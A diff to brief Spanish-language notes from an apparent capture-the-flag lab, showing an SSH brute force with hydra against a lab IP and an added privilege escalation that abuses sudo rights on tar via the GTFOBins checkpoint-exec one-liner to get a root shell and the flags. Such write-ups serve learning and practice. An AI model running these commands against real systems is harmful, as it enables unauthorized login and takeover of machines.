@@ -10,3 +10,6 @@
 - Pruebo a hacer fuerzabruta ssh con el listado de antes a los diferentes usuarios.
 - hydra -l lin -P locks.txt ssh://10.128.160.231 -> sacamos password
 - conectamos ssh lin@ip -> password -> export TERM=xterm para tener una buena tty interactuable.
+- whoami -> lin -> id -> nada raro -> (root) /bin/tar podemos ejecutar /tar como sudo
+- GTFOBins -> sudo tar cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
+- somos root pillamos ambas flags.
